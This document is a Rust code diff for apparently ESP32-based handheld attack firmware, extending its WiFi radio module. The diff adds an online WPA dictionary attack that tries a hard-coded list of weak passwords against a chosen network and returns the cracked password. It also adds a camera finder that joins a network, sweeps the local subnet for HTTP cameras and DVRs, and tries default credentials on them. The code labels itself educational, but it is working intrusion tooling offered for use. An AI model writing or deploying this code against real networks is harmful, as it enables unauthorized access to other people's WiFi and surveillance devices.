@@ -22,6 +22,9 @@
 //! are re-exported flat at the crate root (see main.rs).
 
 pub mod ble_spam;
+pub mod camscan;
+pub mod digest;
+pub mod http;
 pub mod netscan;
 pub mod portal;
 pub mod webui;
@@ -293,6 +296,17 @@ impl Radio {
     /// Blocking WiFi scan -> APs sorted by signal strength. `None` on radio error.
     pub fn scan(&mut self) -> Option<Vec<ScannedAp>> {
         use esp_radio::wifi::scan::ScanConfig;
+        self.scan_cfg(ScanConfig::default().with_max(64))
+    }
+
+    /// Fast single-channel scan for live radar target-tracking (~150 ms vs the
+    /// ~0.5 s full sweep). Only APs on `ch` come back.
+    pub fn scan_channel(&mut self, ch: u8) -> Option<Vec<ScannedAp>> {
+        use esp_radio::wifi::scan::ScanConfig;
+        self.scan_cfg(ScanConfig::default().with_channel(ch).with_max(32))
+    }
+
+    fn scan_cfg(&mut self, cfg: esp_radio::wifi::scan::ScanConfig) -> Option<Vec<ScannedAp>> {
         if !self.ensure_wifi() {
             return None;
         }
@@ -301,7 +315,6 @@ impl Radio {
             let _ = i.sniffer.set_promiscuous_mode(false);
         }
         let c = self.wifi_ctrl.as_mut()?;
-        let cfg = ScanConfig::default().with_max(64);
         match embassy_futures::block_on(c.scan_async(&cfg)) {
             Ok(mut aps) => {
                 aps.sort_by(|a, b| b.signal_strength.cmp(&a.signal_strength));
@@ -551,14 +564,27 @@ impl Radio {
     /// Join the OPEN network `ssid` as a station, then DHCP + port-scan the
     /// gateway. Returns the scan result, or `None` if association failed. The STA
     /// is torn down on exit. (Open networks only — no on-device password entry.)
-    pub fn run_netscan(
-        &mut self,
-        ssid: &str,
-        tick: impl FnMut(&netscan::NetResult) -> bool,
-    ) -> Option<netscan::NetResult> {
-        use esp_radio::wifi::sta::StationConfig;
+    /// Common weak WiFi passwords tried by the WPA online dictionary ladder
+    /// (attempt association with each). Educational: shows how weak defaults fall.
+    const WIFI_PASSWORDS: &'static [&'static str] = &[
+        "12345678", "123456789", "1234567890", "password", "11111111", "00000000",
+        "123456789a", "987654321", "qwerty123", "1q2w3e4r", "11223344", "12341234",
+        "admin1234", "internet", "wifi1234", "00112233", "88888888", "1234512345",
+    ];
+
+    /// Associate with `ssid`. Open APs join directly; encrypted ones run the
+    /// common-password ladder (online dictionary). `prog(i, n)` reports crack
+    /// progress and returns false to abort. On success the STA controller + iface
+    /// are left in `self`; returns the cracked password ("" for open). On failure
+    /// the link is torn down and a SPECIFIC reason string is returned.
+    /// ONE association attempt on a FRESH controller. esp-radio's `set_config`
+    /// PANICS (unknown error WIFI_STATE 0x3006) if reused on a dirty controller
+    /// after a failed connect, so every attempt fully re-inits the WiFi → clean
+    /// state. On success the controller + iface are left in `self`. Returns true
+    /// if associated within `timeout_s`.
+    fn assoc_once(&mut self, cfg: esp_radio::wifi::sta::StationConfig, timeout_s: u64) -> bool {
+        use embassy_futures::select::{select, Either};
         use esp_radio::wifi::{self, Config};
-        self.deinit_ble();
         self.deinit_wifi();
         let w = self
             .wifi_periph
@@ -566,24 +592,116 @@ impl Radio {
             .unwrap_or_else(|| unsafe { esp_hal::peripherals::WIFI::steal() });
         let (mut c, ifs) = match wifi::new(w, Default::default()) {
             Ok(x) => x,
-            Err(_) => return None,
+            Err(_) => return false,
         };
-        if c.set_config(&Config::Station(StationConfig::default().with_ssid(ssid))).is_err() {
-            return None;
-        }
-        let sta = ifs.station; // Interface is Copy
-        let mac = sta.mac_address();
-        // associate (open AP — no password)
-        let associated = embassy_futures::block_on(c.connect_async()).is_ok();
+        let ok = c.set_config(&Config::Station(cfg)).is_ok()
+            && matches!(
+                embassy_futures::block_on(select(
+                    c.connect_async(),
+                    Deadline { start: Instant::now(), dur: Duration::from_secs(timeout_s) },
+                )),
+                Either::First(Ok(_))
+            );
         self.wifi_ctrl = Some(c);
         self.wifi_ifaces = Some(ifs);
-        if !associated {
-            self.deinit_wifi();
-            return None;
+        ok
+    }
+
+    /// `known`: `Some(p)` joins with that password (empty `p` = open network);
+    /// `None` runs the common-password crack ladder. Returns the cracked/used
+    /// password ("" when the caller supplied it). `prog(i,n)` reports crack progress.
+    fn associate(
+        &mut self,
+        ssid: &str,
+        known: Option<&str>,
+        mut prog: impl FnMut(usize, usize) -> bool,
+    ) -> Result<&'static str, &'static str> {
+        use esp_radio::wifi::sta::StationConfig;
+        use esp_radio::wifi::AuthenticationMethod;
+        self.deinit_ble();
+        match known {
+            // user-supplied password (or open) -> one attempt
+            Some(p) => {
+                let cfg = if p.is_empty() {
+                    StationConfig::default().with_ssid(ssid).with_auth_method(AuthenticationMethod::None)
+                } else {
+                    StationConfig::default().with_ssid(ssid).with_password(p.into())
+                };
+                if self.assoc_once(cfg, 12) {
+                    Ok("")
+                } else {
+                    self.deinit_wifi();
+                    Err(if p.is_empty() { "assoc fail (open AP?)" } else { "assoc fail (wrong pass?)" })
+                }
+            }
+            // attack: common-password ladder
+            None => {
+                let n = Self::WIFI_PASSWORDS.len();
+                for (i, pass) in Self::WIFI_PASSWORDS.iter().enumerate() {
+                    if !prog(i, n) {
+                        self.deinit_wifi();
+                        return Err("aborted");
+                    }
+                    esp_println::println!("[WPA] {}/{} try {:?}", i + 1, n, pass);
+                    let cfg = StationConfig::default().with_ssid(ssid).with_password((*pass).into());
+                    let ok = self.assoc_once(cfg, 5);
+                    esp_println::println!("[WPA] {} -> {}", i + 1, ok);
+                    if ok {
+                        return Ok(*pass);
+                    }
+                }
+                self.deinit_wifi();
+                Err("wifi locked (weak-list dry)")
+            }
         }
-        let res = netscan::scan(sta, mac, tick);
+    }
+
+    /// Join `ssid` (`known`: Some(pass)=join, empty=open, None=crack ladder), DHCP,
+    /// then port-scan the gateway. `Err(reason)` carries a SPECIFIC failure string.
+    pub fn run_netscan(
+        &mut self,
+        ssid: &str,
+        known: Option<&str>,
+        mut tick: impl FnMut(&netscan::NetResult) -> bool,
+    ) -> Result<netscan::NetResult, &'static str> {
+        let mut crack = netscan::NetResult::new();
+        crack.phase = "wifi crack";
+        let cracked = self.associate(ssid, known, |i, _n| {
+            crack.scanned = i + 1;
+            tick(&crack)
+        })?;
+        let sta = self.wifi_ifaces.as_ref().ok_or("no iface")?.station;
+        let mac = sta.mac_address();
+        let mut res = netscan::scan(sta, mac, tick);
+        res.set_wifi_pass(cracked);
         self.deinit_wifi();
-        Some(res)
+        Ok(res)
+    }
+
+    // ----------------------------- camera finder -----------------------------
+
+    /// Join `ssid` (`known`: Some(pass)=join, empty=open, None=crack ladder), DHCP,
+    /// then sweep the local `/24` for HTTP cameras/DVRs + try default creds. The STA
+    /// is torn down on exit. `Err(reason)` carries a SPECIFIC failure string.
+    pub fn run_camscan(
+        &mut self,
+        ssid: &str,
+        known: Option<&str>,
+        mut tick: impl FnMut(&camscan::CamResult) -> bool,
+    ) -> Result<camscan::CamResult, &'static str> {
+        let mut crack = camscan::CamResult::new();
+        crack.phase = "wifi crack";
+        let cracked = self.associate(ssid, known, |i, n| {
+            crack.probed = i + 1;
+            crack.total = n;
+            tick(&crack)
+        })?;
+        let sta = self.wifi_ifaces.as_ref().ok_or("no iface")?.station;
+        let mac = sta.mac_address();
+        let mut res = camscan::sweep(sta, mac, tick);
+        res.set_wifi_pass(cracked);
+        self.deinit_wifi();
+        Ok(res)
     }
 
     // ------------------------------ web ui -----------------------------
